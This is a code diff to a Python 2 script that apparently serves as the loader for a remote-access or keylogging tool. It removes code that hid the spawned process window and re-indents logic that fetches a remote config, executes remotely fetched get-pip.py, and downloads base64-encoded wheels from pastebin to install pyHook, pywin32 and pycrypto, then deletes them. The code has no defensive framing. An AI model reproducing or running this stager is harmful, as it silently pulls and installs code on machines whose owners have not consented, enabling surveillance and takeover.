@@ -77,10 +77,7 @@ def abort(output=None):
 def execute(cmd):
     global _debug
     try:
-        info = subprocess.STARTUPINFO()
-        info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
-        info.wShowWindow = subprocess.SW_HIDE
-        subprocess.Popen(cmd, 0, None, None, subprocess.PIPE, subprocess.PIPE, startup=info, shell=True)
+        _ = subprocess.Popen(cmd, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
     except Exception as e:
         debug(e)
 
@@ -112,44 +109,45 @@ def run(*args, **kwargs):
         exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
         execute(sys.argv)
         os.execv(sys.executable, ['python'] + sys.argv)
-    if not kwargs.get('config'):
-        abort('missing config')
     else:
-        _conf = json.loads(urllib.urlopen(kwargs.get('config')).read())
-        os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
-        packages = json.loads(urllib.urlopen(_conf['t']).read()).get(os.name).get(str(struct.calcsize('P') * 8))
-        for name, url in packages.items():
-            if not subprocess.call([_pip, 'show', name], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
-                execute([_pip, 'install', name])
+        if not kwargs.get('config'):
+            abort('missing config')
+        else:
+            _conf = json.loads(urllib.urlopen(kwargs.get('config')).read())
+            os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
+            packages = json.loads(urllib.urlopen(_conf['t']).read()).get(os.name).get(str(struct.calcsize('P') * 8))
+            for name, url in packages.items():
                 if not subprocess.call([_pip, 'show', name], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
-                    if 'pastebin' not in url:
-                        execute([_pip, 'install', url])
-                    else:
-                        if 'pyHook' in name:
-                            wheel = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
-                            with file(wheel, 'wb') as fp:
-                                fp.write(base64.b64decode(urllib.urlopen(url).read()))
-                            execute([_pip, 'install', wheel])
-                            if os.path.isfile(wheel):
-                                os.remove(wheel)
-                        elif 'pypiwin32' in name:
-                            wheel = 'pywin32-221-cp27-cp27m-win_amd64.whl'
-                            with file(wheel, 'wb') as fp:
-                                fp.write(base64.b64decode(urllib.urlopen(url).read()))
-                            execute([_pip, 'install', wheel])
-                            postinstall  = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
-                            if os.path.isfile(postinstall):
-                                execute([postinstall, '-install'])
-                            if os.path.isfile(wheel):
-                                os.remove(wheel)
-                        elif 'pycrypto' in name:
-                            wheel = 'pycrypto-2.6.1-cp27-none-win_amd64.whl'
-                            with file(wheel, 'wb') as fp:
-                                fp.write(base64.b64decode(urllib.urlopen(url).read()))
-                            execute([_pip, 'install', wheel])
-                            if os.path.isfile(wheel):
-                                os.remove(wheel)
-        return _conf
+                    execute([_pip, 'install', name])
+                    if not subprocess.call([_pip, 'show', name], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
+                        if 'pastebin' not in url:
+                            execute([_pip, 'install', url])
+                        else:
+                            if 'pyHook' in name:
+                                wheel = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
+                                with file(wheel, 'wb') as fp:
+                                    fp.write(base64.b64decode(urllib.urlopen(url).read()))
+                                execute([_pip, 'install', wheel])
+                                if os.path.isfile(wheel):
+                                    os.remove(wheel)
+                            elif 'pypiwin32' in name:
+                                wheel = 'pywin32-221-cp27-cp27m-win_amd64.whl'
+                                with file(wheel, 'wb') as fp:
+                                    fp.write(base64.b64decode(urllib.urlopen(url).read()))
+                                execute([_pip, 'install', wheel])
+                                postinstall  = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
+                                if os.path.isfile(postinstall):
+                                    execute([postinstall, '-install'])
+                                if os.path.isfile(wheel):
+                                    os.remove(wheel)
+                            elif 'pycrypto' in name:
+                                wheel = 'pycrypto-2.6.1-cp27-none-win_amd64.whl'
+                                with file(wheel, 'wb') as fp:
+                                    fp.write(base64.b64decode(urllib.urlopen(url).read()))
+                                execute([_pip, 'install', wheel])
+                                if os.path.isfile(wheel):
+                                    os.remove(wheel)
+            return _conf
 
 
 
